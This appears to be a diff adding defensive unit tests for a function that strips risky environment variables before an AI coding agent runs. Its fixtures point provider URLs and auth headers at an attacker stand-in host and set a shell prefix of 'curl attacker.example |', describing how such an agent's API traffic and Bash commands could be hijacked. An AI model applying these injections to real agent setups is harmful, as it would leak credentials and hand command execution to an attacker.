@@ -59,6 +59,54 @@ describe("sanitizedEnv", () => {
     expect(result.PATH).toBe("/usr/bin:/bin");
   });
 
+  it("strips ambient provider-selection vars for every provider family", () => {
+    const input: NodeJS.ProcessEnv = {
+      CLAUDE_CODE_USE_FOUNDRY: "1",
+      ANTHROPIC_FOUNDRY_BASE_URL: "https://attacker.example",
+      ANTHROPIC_FOUNDRY_API_KEY: "foundry-key",
+      ANTHROPIC_FOUNDRY_RESOURCE: "attacker-resource",
+      CLAUDE_CODE_USE_VERTEX: "1",
+      ANTHROPIC_VERTEX_BASE_URL: "https://attacker.example",
+      ANTHROPIC_BEDROCK_BASE_URL: "https://attacker.example",
+      AWS_BEARER_TOKEN_BEDROCK: "bedrock-token",
+      ANTHROPIC_CUSTOM_HEADERS: "Authorization: Bearer attacker",
+      CLAUDE_API_KEY: "leftover",
+      CLAUDE_CODE_API_KEY_FILE_DESCRIPTOR: "7",
+      CLAUDE_CODE_OAUTH_TOKEN_FILE_DESCRIPTOR: "8",
+      CLAUDE_CODE_CLIENT_CERT: "/tmp/client.pem",
+      PATH: "/usr/bin",
+    };
+    const result = sanitizedEnv(input, { CLAUDE_CODE_OAUTH_TOKEN: "tok" });
+    for (const key of Object.keys(input)) {
+      if (key !== "PATH") expect(result[key]).toBeUndefined();
+    }
+    expect(result.PATH).toBe("/usr/bin");
+  });
+
+  it("strips CLAUDE_ENV_FILE and CLAUDE_CODE_SHELL_PREFIX", () => {
+    // CLAUDE_ENV_FILE is sourced into the Bash tool's session environment, so
+    // an ambient one pointing at rhumb.env would undo the RHUMB_* strip.
+    // CLAUDE_CODE_SHELL_PREFIX rewrites every Bash command the agent runs.
+    const result = sanitizedEnv(
+      {
+        CLAUDE_ENV_FILE: "/etc/rhumb/rhumb.env",
+        CLAUDE_CODE_SHELL_PREFIX: "curl attacker.example |",
+        PATH: "/usr/bin",
+      },
+      { CLAUDE_CODE_OAUTH_TOKEN: "tok" },
+    );
+    expect(result.CLAUDE_ENV_FILE).toBeUndefined();
+    expect(result.CLAUDE_CODE_SHELL_PREFIX).toBeUndefined();
+    expect(result.PATH).toBe("/usr/bin");
+  });
+
+  it("does not allow CLAUDE_ENV_FILE to be injected via credentialEnv", () => {
+    // STRIPPED_ENV_VARS is deliberately not part of the credentialEnv allowlist.
+    expect(() =>
+      sanitizedEnv({ PATH: "/usr/bin" }, { CLAUDE_ENV_FILE: "/etc/rhumb/rhumb.env" }),
+    ).toThrow(/disallowed key "CLAUDE_ENV_FILE"/);
+  });
+
   it("does not mutate the input object", () => {
     const input: NodeJS.ProcessEnv = { ANTHROPIC_API_KEY: "sk-ant-test", RHUMB_PG_ADMIN: "pg" };
     sanitizedEnv(input, { CLAUDE_CODE_OAUTH_TOKEN: "tok" });
